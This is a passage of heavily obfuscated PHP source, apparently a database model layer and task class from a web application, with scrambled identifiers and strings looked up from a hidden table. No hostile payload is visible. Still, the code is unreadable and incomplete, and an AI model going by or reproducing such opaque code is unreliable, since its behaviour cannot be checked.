unset($GLOBALS[$ŒÂÏ®Ğ[7]][$ŒÂÏ®Ğ[430]]); } unset($GLOBALS[$ŒÂÏ®Ğ[440]]); unset($GLOBALS[$ŒÂÏ®Ğ[442]]); } protected function selectPage($¿¥¨õ´½ = 200, $ªÓôœ­– = 1) { $ÕòößÎª =& $_SERVER[åÄ¼Ùßš]; global $in; $”¶ËÀ×ñ = $this->optionsValue(); $×ìÍÈ—í = 50000; $¿¥¨õ´½ = isset($in[$ÕòößÎª[441]]) && $in[$ÕòößÎª[441]] ? $in[$ÕòößÎª[441]] : $¿¥¨õ´½; if ($¿¥¨õ´½ === -1) { $in[$ÕòößÎª[441]] = !1; $×ìÍÈ—í = 100000000; $¿¥¨õ´½ = $×ìÍÈ—í; } $²ûÈ£ë = $”¶ËÀ×ñ; $²ûÈ£ë[$ÕòößÎª[443]] = array(); $¿¥¨õ´½ = intval($¿¥¨õ´½); $¿¥¨õ´½ = $¿¥¨õ´½ <= 5 ? 5 : ($¿¥¨õ´½ >= $×ìÍÈ—í ? $×ìÍÈ—í : $¿¥¨õ´½); $ªÓôœ­– = intval(isset($in[$ÕòößÎª[430]]) && $in[$ÕòößÎª[430]] ? $in[$ÕòößÎª[430]] : $ªÓôœ­–); $ªÓôœ­– = $ªÓôœ­– <= 1 ? 1 : $ªÓôœ­–; $Ãî„¦Êã = array(); $Å’¾Ÿô = 1; if ($ªÓôœ­– == 1 && $Å’¾Ÿô) { $this->optionsValue($”¶ËÀ×ñ); $Ãî„¦Êã = $this->page($ªÓôœ­–, $¿¥¨õ´½)->select(); $ˆ¨ú” = is_array($Ãî„¦Êã) ? count($Ãî„¦Êã) : 0; if ($ˆ¨ú” < $¿¥¨õ´½) { $šóø×Œ = 1; } else { $this->optionsValue($²ûÈ£ë); $ˆ¨ú” = intval($this->count()); $šóø×Œ = ceil($ˆ¨ú” / $¿¥¨õ´½); } } else { $this->optionsValue($²ûÈ£ë); $ˆ¨ú” = intval($this->count()); $šóø×Œ = ceil($ˆ¨ú” / $¿¥¨õ´½); $ªÓôœ­– = $ªÓôœ­– >= $šóø×Œ ? $šóø×Œ : $ªÓôœ­–; $this->optionsValue($”¶ËÀ×ñ); $Ãî„¦Êã = $this->page($ªÓôœ­–, $¿¥¨õ´½)->select(); } if (!is_array($Ãî„¦Êã)) { $Ãî„¦Êã = array(); } if ($šóø×Œ == 1) { $ˆ¨ú” = count($Ãî„¦Êã); } $†ñÉ¶±Ü = array($ÕòößÎª[444] => array($ÕòößÎª[445] => $ˆ¨ú”, $ÕòößÎª[441] => $¿¥¨õ´½, $ÕòößÎª[430] => $ªÓôœ­–, $ÕòößÎª[446] => $šóø×Œ), $ÕòößÎª[447] => $Ãî„¦Êã); return $†ñÉ¶±Ü; } protected function checkLength($œ–î¬Ì, $³ƒµæŠÉ = 0, $Âë²¶…£ = '') { $ÄÉ°°ïÌ =& $_SERVER[åÄ¼Ùßš]; $³ƒµæŠÉ = $³ƒµæŠÉ ? $³ƒµæŠÉ : 65536; if (!$œ–î¬Ì || strlen($œ–î¬Ì) < $³ƒµæŠÉ) { return; } $Âë²¶…£ = $Âë²¶…£ ? $Âë²¶…£ . $ÄÉ°°ïÌ[74] : $ÄÉ°°ïÌ[12]; show_json($Âë²¶…£ . LNG($ÄÉ°°ïÌ[448]) . "\x28{$³ƒµæŠÉ}\51", !1); } protected function metaSet($è¬Ë‰ÏÀ, $Š“˜Ÿî = null, $Àûø¼¥‡ = null) { $ÁûÖ£·¸ =& $_SERVER[åÄ¼Ùßš]; if (!$this->tableMeta || !$è¬Ë‰ÏÀ) { return !1; } $“±¥çÎ¢ = $this->tableMeta[$ÁûÖ£·¸[449]]; $Ïã¦¨é = $this->tableMeta[$ÁûÖ£·¸[450]]; $ëÆ®³Õ… = Model($Ïã¦¨é); $ö‘şŸí = array($“±¥çÎ¢ => $è¬Ë‰ÏÀ, $ÁûÖ£·¸[451] => $Š“˜Ÿî); if (is_null($Š“˜Ÿî)) { return $ëÆ®³Õ…->where(array($“±¥çÎ¢ => $è¬Ë‰ÏÀ))->delete(); } if (is_null($Àûø¼¥‡) && is_string($Š“˜Ÿî)) { return $ëÆ®³Õ…->where($ö‘şŸí)->delete(); } $’Ì‘ö¬ = is_array($Š“˜Ÿî) ? $Š“˜Ÿî : array(); if (is_string($Š“˜Ÿî)) { $’Ì‘ö¬[$Š“˜Ÿî] = $Àûø¼¥‡; } $åîÉëÖÂ = array(); foreach ($’Ì‘ö¬ as $¶Ò–¡è† => $¹·Ş¼¨ı) { if (is_null($¹·Ş¼¨ı) && is_string($¶Ò–¡è†)) { $ëÆ®³Õ…->where(array($“±¥çÎ¢ => $è¬Ë‰ÏÀ, $ÁûÖ£·¸[451] => $¶Ò–¡è†))->delete(); continue; } $this->checkLength($¹·Ş¼¨ı, !1, $Ïã¦¨é . $ÁûÖ£·¸[4] . $¶Ò–¡è†); $åîÉëÖÂ[] = array($“±¥çÎ¢ => $è¬Ë‰ÏÀ, $ÁûÖ£·¸[97] => $¶Ò–¡è†, $ÁûÖ£·¸[452] => $¹·Ş¼¨ı); } $ÄğÚ”á‘ = $ÁûÖ£·¸[453] . $Ïã¦¨é; CacheLock::lock($ÄğÚ”á‘); $ëÆ®³Õ…->where(array($“±¥çÎ¢ => $è¬Ë‰ÏÀ))->addAll($åîÉëÖÂ, array(), !0); CacheLock::unlock($ÄğÚ”á‘); return !0; } public function metaGet($æÁÀø°Ä, $©ÁÕõ¹Û = false) { $ŒŒ÷×º =& $_SERVER[åÄ¼Ùßš]; if (!$this->tableMeta) { return array(); } $ÖÙµùÔ‚ = $this->tableMeta[$ŒŒ÷×º[449]]; $§ä ¯‡° = Model($this->tableMeta[$ŒŒ÷×º[450]]); if ($©ÁÕõ¹Û) { $ÚûÛØ¿ = array($ÖÙµùÔ‚ => $æÁÀø°Ä, $ŒŒ÷×º[97] => $©ÁÕõ¹Û); return $§ä ¯‡°->where($ÚûÛØ¿)->getField($ŒŒ÷×º[452]); } $ÚûÛØ¿ = array($ÖÙµùÔ‚ => $æÁÀø°Ä); $Ëâü–¢ê = $§ä ¯‡°->field($ŒŒ÷×º[454])->where($ÚûÛØ¿)->select(); $Ëâü–¢ê = array_to_keyvalue($Ëâü–¢ê, $ŒŒ÷×º[97], $ŒŒ÷×º[452]); return $Ëâü–¢ê; } private function checkDataAutoHas($ÅÇõÅ‘¦) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $½İÂ°“´) { if (in_array($ÅÇõÅ‘¦, explode($_SERVER[åÄ¼Ùßš][50], $½İÂ°“´[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$‡§º¶Ì, $•¢İ¶ßÔ) { $×÷Ûò­ =& $_SERVER[åÄ¼Ùßš]; if (!is_array($‡§º¶Ì)) { return; } foreach ($this->dataAuto as $–ô© ­²) { $áĞ³¼ = $–ô© ­²[0]; if (!in_array($•¢İ¶ßÔ, explode($×÷Ûò­[50], $–ô© ­²[2]))) { continue; } switch (trim($–ô© ­²[3])) { case $×÷Ûò­[398]: case $×÷Ûò­[399]: $¯¯¶ÓãÑ = $–ô© ­²[1]; $®íÚóÎ = isset($–ô© ­²[4]) ? (array) $–ô© ­²[4] : array(); if ($¯¯¶ÓãÑ == $×÷Ûò­[207] && array_key_exists($áĞ³¼, $‡§º¶Ì)) { if (!$‡§º¶Ì[$áĞ³¼]) { unset($‡§º¶Ì[$áĞ³¼]); } break; } if (isset($‡§º¶Ì[$áĞ³¼])) { array_unshift($®íÚóÎ, $‡§º¶Ì[$áĞ³¼]); } if ($×÷Ûò­[398] == $–ô© ­²[3]) { $‡§º¶Ì[$áĞ³¼] = call_user_func_array($¯¯¶ÓãÑ, $®íÚóÎ); } else { $‡§º¶Ì[$áĞ³¼] = call_user_func_array(array(&$this, $¯¯¶ÓãÑ), $®íÚóÎ); } break; case $×÷Ûò­[350]: if (isset($‡§º¶Ì[$áĞ³¼]) && $‡§º¶Ì[$áĞ³¼]) { $‡§º¶Ì[$áĞ³¼] = call_user_func_array(array(&$this, $–ô© ­²[1]), array($‡§º¶Ì[$áĞ³¼])); } break; case $×÷Ûò­[353]: $‡§º¶Ì[$áĞ³¼] = $‡§º¶Ì[$–ô© ­²[1]]; break; case $×÷Ûò­[371]: if (isset($‡§º¶Ì[$áĞ³¼]) && !is_string($‡§º¶Ì[$áĞ³¼])) { $‡§º¶Ì[$áĞ³¼] = json_encode_force($‡§º¶Ì[$áĞ³¼]); } break; case $×÷Ûò­[400]: if ($‡§º¶Ì[$áĞ³¼] === $×÷Ûò­[12]) { unset($‡§º¶Ì[$áĞ³¼]); } break; case $×÷Ûò­[401]: $‡§º¶Ì[$áĞ³¼] = $–ô© ­²[1]; default: break; } } if ($•¢İ¶ßÔ == $×÷Ûò­[432]) { $ÄÃ†ÃªŞ = strtolower($this->db->getDbType()); if (strpos($ÄÃ†ÃªŞ, $×÷Ûò­[13]) !== 0) { return; } $‹¶¶Šô = $this->field(!0)->fields; $ñ™äŒ€İ = $‹¶¶Šô[$×÷Ûò­[332]]; if (isset($‹¶¶Šô[$×÷Ûò­[331]])) { unset($ñ™äŒ€İ[$‹¶¶Šô[$×÷Ûò­[331]]]); } foreach ($ñ™äŒ€İ as $¿§Å‹õÕ => $•¢İ¶ßÔ) { if (!isset($‡§º¶Ì[$¿§Å‹õÕ])) { $‡§º¶Ì[$¿§Å‹õÕ] = $×÷Ûò­[12]; } } } } private function dataAfterFilter(&$­ß“çûø) { $¡ôÅé‰Ë =& $_SERVER[åÄ¼Ùßš]; foreach ($this->dataAuto as $¢Â¾µ–İ) { $—š¼ş‡ = $¢Â¾µ–İ[0]; if (!isset($­ß“çûø[$—š¼ş‡])) { continue; } if (!in_array($¡ôÅé‰Ë[434], explode($¡ôÅé‰Ë[50], $¢Â¾µ–İ[2]))) { continue; } switch (trim($¢Â¾µ–İ[3])) { case $¡ôÅé‰Ë[398]: case $¡ôÅé‰Ë[399]: $›âä‡ò¦ = isset($¢Â¾µ–İ[4]) ? (array) $¢Â¾µ–İ[4] : array(); array_unshift($›âä‡ò¦, $­ß“çûø[$—š¼ş‡]); if (isset($¢Â¾µ–İ[4]) && $¢Â¾µ–İ[4] == $¡ôÅé‰Ë[455]) { $›âä‡ò¦ = array($­ß“çûø[$—š¼ş‡]); } if ($¡ôÅé‰Ë[398] == $¢Â¾µ–İ[3]) { $­ß“çûø[$—š¼ş‡] = call_user_func_array($¢Â¾µ–İ[1], $›âä‡ò¦); } else { $­ß“çûø[$—š¼ş‡] = call_user_func_array(array(&$this, $¢Â¾µ–İ[1]), $›âä‡ò¦); } break; case $¡ôÅé‰Ë[350]: if (isset($­ß“çûø[$—š¼ş‡]) && $­ß“çûø[$—š¼ş‡]) { $­ß“çûø[$—š¼ş‡] = call_user_func_array(array(&$this, $¢Â¾µ–İ[1]), array($­ß“çûø[$—š¼ş‡])); } break; case $¡ôÅé‰Ë[353]: $­ß“çûø[$—š¼ş‡] = $­ß“çûø[$¢Â¾µ–İ[1]]; break; case $¡ôÅé‰Ë[371]: $×ø•¦æÑ = $­ß“çûø[$—š¼ş‡]; $­ß“çûø[$—š¼ş‡] = json_decode($×ø•¦æÑ, !0); if (is_null($­ß“çûø[$—š¼ş‡])) { $­ß“çûø[$—š¼ş‡] = $×ø•¦æÑ; } break; case $¡ôÅé‰Ë[400]: if ($­ß“çûø[$—š¼ş‡] === $¡ôÅé‰Ë[12]) { unset($­ß“çûø[$—š¼ş‡]); } break; case $¡ôÅé‰Ë[401]: $­ß“çûø[$—š¼ş‡] = $¢Â¾µ–İ[1]; break; default: break; } } } public function saveAll($«©„Ç®Ä, $Ã‚šÉ¥ = false) { $íŞÑºÇ› =& $_SERVER[åÄ¼Ùßš]; $•ÕıµÈ§ = $this->db; $¡À‡Êíì = $this->tablePrefix . $this->tableName; $Û®†Ÿé¶ = $this->saveAllChunkMake($«©„Ç®Ä); $Ã‚šÉ¥ = is_array($Ã‚šÉ¥) ? $Ã‚šÉ¥ : array(); foreach ($Û®†Ÿé¶ as $Ğø¼½µÕ) { $±î˜äÊ = $íŞÑºÇ›[12]; $½ÁõûÏ¿ = $íŞÑºÇ›[12]; $™ƒâÍ„º = array(); $üÄò¥­À = array(); foreach ($Ğø¼½µÕ as $§ŞÖ–İ => $•òÍãÔº) { $±î˜äÊ = $•òÍãÔº[$íŞÑºÇ›[456]]; $üÄò¥­À[] = $•òÍãÔº[$íŞÑºÇ›[457]]; $ªÚœµŸæ = $•ÕıµÈ§->parseValue($•òÍãÔº[$íŞÑºÇ›[457]]); foreach ($•òÍãÔº[$íŞÑºÇ›[458]] as $è‰ğ€± => $Ü¼úŸö¸) { if (!$™ƒâÍ„º[$è‰ğ€±]) { $™ƒâÍ„º[$è‰ğ€±] = array(); } $™ƒâÍ„º[$è‰ğ€±][] = $íŞÑºÇ›[459] . $ªÚœµŸæ . $íŞÑºÇ›[460] . $•ÕıµÈ§->parseValue($Ü¼úŸö¸); } } $÷‡—ÅÅ¡ = $±î˜äÊ; $÷‡—ÅÅ¡ = $•ÕıµÈ§->parseKey($÷‡—ÅÅ¡); foreach ($™ƒâÍ„º as $è‰ğ€± => $Õ’£ìæó) { $½ÁõûÏ¿ .= $íŞÑºÇ›[288] . $•ÕıµÈ§->parseKey($è‰ğ€±) . $íŞÑºÇ›[461] . $÷‡—ÅÅ¡ . $íŞÑºÇ›[462]; $½ÁõûÏ¿ .= implode($íŞÑºÇ›[288], $Õ’£ìæó) . $íŞÑºÇ›[463]; } $Ç¦ªı‹Í = $Ã‚šÉ¥; $Ç¦ªı‹Í[$±î˜äÊ] = array($íŞÑºÇ›[7], $üÄò¥­À); $¹ÌÄ£Û = "\x55\120\x44\x41\124\x45\x20\140{$¡À‡Êíì}\x60\x20\123\105\x54\40" . rtrim($½ÁõûÏ¿, $íŞÑºÇ›[50]) . $íŞÑºÇ›[288] . $•ÕıµÈ§->parseWhere($Ç¦ªı‹Í); $this->execute($¹ÌÄ£Û); $this->chunkEventCheck(count($Ğø¼½µÕ)); } $this->chunkEventSet(); } public function saveAllEach($ĞÈê¦«ì, $ãá¹œ£´ = false) { $Ø¯äÌæ® =& $_SERVER[åÄ¼Ùßš]; $ïî†˜ÇÒ = $this->db; $ñö›ùÜ¦ = $this->tablePrefix . $this->tableName; $Ü”€ªœ¼ = $this->saveAllChunkMake($ĞÈê¦«ì); $ãá¹œ£´ = is_array($ãá¹œ£´) ? $ãá¹œ£´ : array(); foreach ($Ü”€ªœ¼ as $‰ûËÃ”) { foreach ($‰ûËÃ” as $Œš«ĞÖ¹ => $ÖŞÆìÀÖ) { $²¨³òú— = $Ø¯äÌæ®[464]; foreach ($ÖŞÆìÀÖ[$Ø¯äÌæ®[458]] as $Ó¾»Ü™ => $ÛıŸú´Ê) { $²¨³òú— .= $ïî†˜ÇÒ->parseKey($Ó¾»Ü™) . $Ø¯äÌæ®[465] . $ïî†˜ÇÒ->parseValue($ÛıŸú´Ê) . $Ø¯äÌæ®[50]; } $àä´ÀÍó = $ãá¹œ£´; $àä´ÀÍó[$ÖŞÆìÀÖ[$Ø¯äÌæ®[456]]] = $ÖŞÆìÀÖ[$Ø¯äÌæ®[457]]; $×üŸïÎ = "\125\120\104\101\124\105\x20\x60{$ñö›ùÜ¦}\x60\40\123\105\124\40" . rtrim($²¨³òú—, $Ø¯äÌæ®[50]) . $Ø¯äÌæ®[466] . $ïî†˜ÇÒ->parseWhere($àä´ÀÍó) . $Ø¯äÌæ®[467]; $this->execute($×üŸïÎ); } $this->chunkEventCheck(count($‰ûËÃ”)); } $this->chunkEventSet(); } private function saveAllChunkMake($Ü¡§³Œ) { $ÆÑ±şÊæ =& $_SERVER[åÄ¼Ùßš]; $ã×´×± = self::SQL_WHERE_IN_CHUNK; $Ü¡§³Œ = is_array($Ü¡§³Œ) ? $Ü¡§³Œ : array(); $ÓúÏ®İñ = array(); $³ŸÖÎä¨ = ceil(count($Ü¡§³Œ) / $ã×´×±); for ($œª±¿Õ = 0; $œª±¿Õ < $³ŸÖÎä¨; $œª±¿Õ++) { $¸£¦ú³è = array(); $£ÊõÄí÷ = array_slice($Ü¡§³Œ, $œª±¿Õ * $ã×´×±, $ã×´×±); foreach ($£ÊõÄí÷ as $¬°Ûå») { if (!is_array($¬°Ûå») || count($¬°Ûå») < 4 || count($¬°Ûå») % 2 != 0) { continue; } $ŒÁÖÉ­À = array(); for ($Ø­ƒ¨€Š = 2; $Ø­ƒ¨€Š < count($¬°Ûå»); $Ø­ƒ¨€Š += 2) { $ŒÁÖÉ­À[$¬°Ûå»[$Ø­ƒ¨€Š]] = $¬°Ûå»[$Ø­ƒ¨€Š + 1]; } $¸£¦ú³è[] = array($ÆÑ±şÊæ[456] => $¬°Ûå»[0], $ÆÑ±şÊæ[457] => $¬°Ûå»[1], $ÆÑ±şÊæ[458] => $ŒÁÖÉ­À); } $ÓúÏ®İñ[] = $¸£¦ú³è; } return $ÓúÏ®İñ; } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Çş‰¥’ = false, $ƒİ³æ¢ = false) { $this->_chunkEvent = $Çş‰¥’; $this->_chunkEventParam = $ƒİ³æ¢; } private function chunkEventCheck($Õ–¶ÀØ²) { if (!$this->_chunkEvent) { return; } $‘Ş†„ã’ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $‘Ş†„ã’[$_SERVER[åÄ¼Ùßš][468]] = $Õ–¶ÀØ²; Hook::trigger($this->_chunkEvent, $‘Ş†„ã’); } public function addAll($îô©Ùà€, $¶ÔŠ†î¹ = array(), $çÀĞ³¨û = false) { $²‹Î•°Ÿ =& $_SERVER[åÄ¼Ùßš]; ignore_timeout(); $×³Åèµ˜ = self::SQL_WHERE_IN_CHUNK; if (empty($îô©Ùà€)) { $this->error = think_lang($²‹Î•°Ÿ[351]); return !1; } $¶ÔŠ†î¹ = $this->_parseOptions($¶ÔŠ†î¹); foreach ($îô©Ùà€ as $ûİ¡ü™„ => $Ìöõ¼÷‹) { $îô©Ùà€[$ûİ¡ü™„] = $this->_facade($Ìöõ¼÷‹); $this->_beforeInsert($îô©Ùà€[$ûİ¡ü™„], $¶ÔŠ†î¹); } if (method_exists($this->db, $²‹Î•°Ÿ[352])) { for ($°Õ‹ÎÛ = 0; $°Õ‹ÎÛ < count($îô©Ùà€); $°Õ‹ÎÛ += $×³Åèµ˜) { $á¾¡¦‘ù = array_slice($îô©Ùà€, $°Õ‹ÎÛ, $×³Åèµ˜); if (!is_array($á¾¡¦‘ù) || count($á¾¡¦‘ù) == 0) { break; } $İÕÂö¤ = $this->db->insertAll($á¾¡¦‘ù, $¶ÔŠ†î¹, $çÀĞ³¨û); $this->chunkEventCheck(count($á¾¡¦‘ù)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($îô©Ùà€ as $ûİ¡ü™„ => $Ìöõ¼÷‹) { $İÕÂö¤ = $this->db->insert($Ìöõ¼÷‹, $¶ÔŠ†î¹, $çÀĞ³¨û); } $this->commit(); } if (!1 !== $İÕÂö¤) { $Íõö×• = $this->getLastInsID(); if ($Íõö×•) { return $Íõö×•; } } return $İÕÂö¤; } public function save($”¥ß±éÑ = '', $ÍÌØ¹¨ = array()) { $¬ÚÕÙ£­ =& $_SERVER[åÄ¼Ùßš]; $¾²ğòî = self::SQL_WHERE_IN_CHUNK; $ÑÆ²€˜ = $this->optionsValue(); $ƒ†Ü¥ãó = $this->findWhereField($ÑÆ²€˜); if (!$ƒ†Ü¥ãó) { return parent::save($”¥ß±éÑ, $ÍÌØ¹¨); } $ÄŞñÔ¢À = 0; $¥‚ùæÙÈ = $ÑÆ²€˜[$¬ÚÕÙ£­[355]][$ƒ†Ü¥ãó][1]; $¥‚ùæÙÈ = is_array($¥‚ùæÙÈ) ? $¥‚ùæÙÈ : array(); $Â³½ˆ = count($¥‚ùæÙÈ); for ($‹Ñß™Ö’ = 0; $‹Ñß™Ö’ < $Â³½ˆ; $‹Ñß™Ö’ += $¾²ğòî) { $ŸÎ¯¸•˜ = array_slice($¥‚ùæÙÈ, $‹Ñß™Ö’, $¾²ğòî); if (!is_array($ŸÎ¯¸•˜) || count($ŸÎ¯¸•˜) == 0) { break; } $ÑÆ²€˜[$¬ÚÕÙ£­[355]][$ƒ†Ü¥ãó][1] = $ŸÎ¯¸•˜; $this->optionsValue($ÑÆ²€˜); $ÄŞñÔ¢À += parent::save($”¥ß±éÑ, $ÍÌØ¹¨); $this->chunkEventCheck(count($ŸÎ¯¸•˜)); } $this->chunkEventSet(); return $ÄŞñÔ¢À; } public function add($İ§–Èì = '', $æğô³  = array(), $¿Òâñë = false) { if ($this->addTaskStatus && is_array($İ§–Èì)) { $this->addTaskData[] = $İ§–Èì; return; } return parent::add($İ§–Èì, $æğô³ , $¿Òâñë); } public function parseWhereLike($‡¼ºÑŠŞ, $•âß¢“Ğ = '', $Ö¿‹¡‚§ = false, &$Óãé®Òñ = false) { $ÚşØ”Æˆ =& $_SERVER[åÄ¼Ùßš]; $Í‰‰İ»¯ = $GLOBALS[$ÚşØ”Æˆ[6]][$ÚşØ”Æˆ[469]]; if (!$Í‰‰İ»¯[$ÚşØ”Æˆ[470]]) { return $‡¼ºÑŠŞ; } if (!is_array($‡¼ºÑŠŞ)) { return $‡¼ºÑŠŞ; } $““ğ†‚° = array(); $á«ãÔ®¡ = 0; foreach ($‡¼ºÑŠŞ as $ÊìÎ ç¦ => $¸’Ó€É) { if (is_array($¸’Ó€É) && count($¸’Ó€É) == 2 && $¸’Ó€É[0] == $ÚşØ”Æˆ[471] && is_string($¸’Ó€É[1]) && substr($¸’Ó€É[1], 0, 1) == $ÚşØ”Æˆ[472] && substr($¸’Ó€É[1], strlen($¸’Ó€É[1]) - 1, 1) == $ÚşØ”Æˆ[472]) { $Óãé®Òñ = !0; $º¢ì¾à‘ = is_string($ÊìÎ ç¦) ? $ÊìÎ ç¦ : $•âß¢“Ğ; $…ĞñæÖ£ = substr($¸’Ó€É[1], 1, strlen($¸’Ó€É[1]) - 2); $…ĞñæÖ£ = $this->db->escapeString($…ĞñæÖ£); if (!strpos($º¢ì¾à‘, $ÚşØ”Æˆ[10])) { $º¢ì¾à‘ = $ÚşØ”Æˆ[473] . $º¢ì¾à‘ . $ÚşØ”Æˆ[473]; } $ò§±ËÏ = $ÚşØ”Æˆ[223] . $…ĞñæÖ£ . $ÚşØ”Æˆ[223]; $…ĞñæÖ£ = str_replace(array($ÚşØ”Æˆ[10], $ÚşØ”Æˆ[474], $ÚşØ”Æˆ[11]), $ÚşØ”Æˆ[475], $…ĞñæÖ£); if ($Í‰‰İ»¯[$ÚşØ”Æˆ[476]]) { $ò§±ËÏ = $ÚşØ”Æˆ[477] . $…ĞñæÖ£ . $ÚşØ”Æˆ[478]; if ($Í‰‰İ»¯[$ÚşØ”Æˆ[479]]) { $ò§±ËÏ = $ÚşØ”Æˆ[478] . $…ĞñæÖ£ . $ÚşØ”Æˆ[477]; } } $““ğ†‚°[$á«ãÔ®¡] = $ÚşØ”Æˆ[480] . $º¢ì¾à‘ . $ÚşØ”Æˆ[481] . $ò§±ËÏ . $ÚşØ”Æˆ[482]; $á«ãÔ®¡++; continue; } if (is_array($¸’Ó€É)) { $•âß¢“Ğ = is_string($ÊìÎ ç¦) ? $ÊìÎ ç¦ : $•âß¢“Ğ; $¸’Ó€É = $this->parseWhereLike($¸’Ó€É, $•âß¢“Ğ, !0, $Óãé®Òñ); } if (is_numeric($ÊìÎ ç¦)) { $““ğ†‚°[$á«ãÔ®¡] = $¸’Ó€É; $á«ãÔ®¡++; } else { $““ğ†‚°[$ÊìÎ ç¦] = $¸’Ó€É; } } if ($Óãé®Òñ && !$Ö¿‹¡‚§) { } return $““ğ†‚°; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($‘Šá”Å = array()) { $éíÆÔÄ‚ =& $_SERVER[åÄ¼Ùßš]; $à¥’Ã‡Ş = self::SQL_WHERE_IN_CHUNK; $Ë—÷ê = $this->optionsValue(); $±ÜÌÑÈß = $this->findWhereField($Ë—÷ê); if (!$±ÜÌÑÈß || isset($Ë—÷ê[$éíÆÔÄ‚[370]]) || isset($Ë—÷ê[$éíÆÔÄ‚[430]])) { return parent::select($‘Šá”Å); } $Û©ò½¢  = $Ë—÷ê[$éíÆÔÄ‚[355]][$±ÜÌÑÈß][1]; $Û©ò½¢  = is_array($Û©ò½¢ ) ? $Û©ò½¢  : array(); $ï©¾ğÙ = null; for ($…Åçæã = 0; $…Åçæã < count($Û©ò½¢ ); $…Åçæã += $à¥’Ã‡Ş) { $å µ°â = array_slice($Û©ò½¢ , $…Åçæã, $à¥’Ã‡Ş); if (!is_array($å µ°â) || count($å µ°â) == 0) { break; } $Ë—÷ê[$éíÆÔÄ‚[355]][$±ÜÌÑÈß][1] = $å µ°â; $this->optionsValue($Ë—÷ê); $³„È‰¹ = parent::select($‘Šá”Å); if (!$³„È‰¹) { continue; } $ï©¾ğÙ = is_array($ï©¾ğÙ) ? $ï©¾ğÙ : array(); $ï©¾ğÙ = array_merge($ï©¾ğÙ, $³„È‰¹); } return $ï©¾ğÙ; } public function delete($µÂÚÖĞ‡ = array()) { $¸¨â”µ =& $_SERVER[åÄ¼Ùßš]; $”í²æú¸ = self::SQL_WHERE_IN_CHUNK; $Ÿ Ë‰ˆ÷ = $this->optionsValue(); $æ”¥¥¢ß = $this->findWhereField($Ÿ Ë‰ˆ÷); if (!$æ”¥¥¢ß) { return parent::delete($µÂÚÖĞ‡); } $í²Ò÷„€ = 0; $ €½ÊŸ = $Ÿ Ë‰ˆ÷[$¸¨â”µ[355]][$æ”¥¥¢ß][1]; $ €½ÊŸ = is_array($ €½ÊŸ) ? $ €½ÊŸ : array(); for ($áıÊÂøª = 0; $áıÊÂøª < count($ €½ÊŸ); $áıÊÂøª += $”í²æú¸) { $¢ ¹¥³« = array_slice($ €½ÊŸ, $áıÊÂøª, $”í²æú¸); if (!is_array($¢ ¹¥³«) || count($¢ ¹¥³«) == 0) { break; } $Ÿ Ë‰ˆ÷[$¸¨â”µ[355]][$æ”¥¥¢ß][1] = $¢ ¹¥³«; $this->optionsValue($Ÿ Ë‰ˆ÷); $í²Ò÷„€ += parent::delete($µÂÚÖĞ‡); } return $í²Ò÷„€; } private function findWhereField($ÀšÙ½ô») { $Ï‰ßçÆí =& $_SERVER[åÄ¼Ùßš]; $À¿Æ‘¤è = self::SQL_WHERE_IN_CHUNK; if (!is_array($ÀšÙ½ô») || !is_array($ÀšÙ½ô»[$Ï‰ßçÆí[355]])) { return !1; } foreach ($ÀšÙ½ô»[$Ï‰ßçÆí[355]] as $ø‚ö–ÔÁ => $ ´¨²°) { if (is_array($ ´¨²°) && isset($ ´¨²°[0]) && is_string($ ´¨²°[0]) && strtolower($ ´¨²°[0]) == $Ï‰ßçÆí[7] && is_array($ ´¨²°[1]) && count($ ´¨²°[1]) > $À¿Æ‘¤è) { ignore_timeout(); return $ø‚ö–ÔÁ; } } return !1; } public function setMasterDB($Ê¶ş—¯Ã = true) { think_config($_SERVER[åÄ¼Ùßš][483], $Ê¶ş—¯Ã); } } goto e™êŠÀ™ÁÚ; B³À›ç‚¯†: class Task { const STATYS_STOP = "\163\164\157\x70"; const STATYS_RUNNING = "\x72\x75\156\x6e\x69\156\147"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ò±í¯À, $éÓ³ó‡ = '', $‰şäÔëš = 0, $–¸Õó¾ = '') { $¤ıÖ“† =& $_SERVER[åÄ¼Ùßš]; if (self::get($ò±í¯À)) { return; } $this->task = array($¤ıÖ“†[484] => $ò±í¯À, $¤ıÖ“†[1817] => USER_ID, $¤ıÖ“†[1704] => $–¸Õó¾, $¤ıÖ“†[537] => $¤ıÖ“†[12], $¤ıÖ“†[33] => $éÓ³ó‡, $¤ıÖ“†[1173] => $¤ıÖ“†[12], $¤ıÖ“†[1171] => $‰şäÔëš, $¤ıÖ“†[1818] => 0, $¤ıÖ“†[1819] => 0, $¤ıÖ“†[1820] => 0, $¤ıÖ“†[1821] => timeFloat(), $¤ıÖ“†[1822] => 0, $¤ıÖ“†[1823] => 0, $¤ıÖ“†[1824] => 0, $¤ıÖ“†[1825] => 0, $¤ıÖ“†[843] => $¤ıÖ“†[1766]); $GLOBALS[$¤ıÖ“†[1826]] = 1; Hook::bind($¤ıÖ“†[1770], array($this, $¤ıÖ“†[1827])); Hook::bind($¤ıÖ“†[1828], array($this, $¤ıÖ“†[1829])); $this->startAfter(); Hook::trigger($¤ıÖ“†[1830], $this->task); $this->task[$¤ıÖ“†[1823]] = timeFloat(); } public function end($•¡ûİĞ = '') { $¸¨ÖÚ¼È =& $_SERVER[åÄ¼Ùßš]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$¸¨ÖÚ¼È[1823]]) { self::valueSet($this->task[$¸¨ÖÚ¼È[484]], !1); } $this->isEnd = !0; if ($•¡ûİĞ) { $this->task[$¸¨ÖÚ¼È[537]] = $•¡ûİĞ; } self::log($¸¨ÖÚ¼È[1831] . $this->task[$¸¨ÖÚ¼È[484]] . $¸¨ÖÚ¼È[1832] . sprintf($¸¨ÖÚ¼È[956], timeFloat() - $this->task[$¸¨ÖÚ¼È[1821]]) . $¸¨ÖÚ¼È[1833]); Hook::unbind($¸¨ÖÚ¼È[1770], array($this, $¸¨ÖÚ¼È[1827])); Hook::unbind($¸¨ÖÚ¼È[1828], array($this, 